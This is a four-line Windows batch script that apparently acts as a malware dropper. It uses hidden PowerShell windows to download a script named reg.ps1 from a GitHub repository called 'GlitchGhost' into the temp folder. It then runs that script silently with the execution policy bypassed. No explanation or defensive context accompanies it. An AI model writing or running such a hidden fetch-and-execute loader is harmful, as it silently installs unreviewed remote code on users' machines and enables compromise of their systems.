@echo off
set "ps1file=%TEMP%\reg.ps1"
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/reg.ps1' -OutFile '%ps1file%'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File \"%ps1file%\"' -WindowStyle Hidden"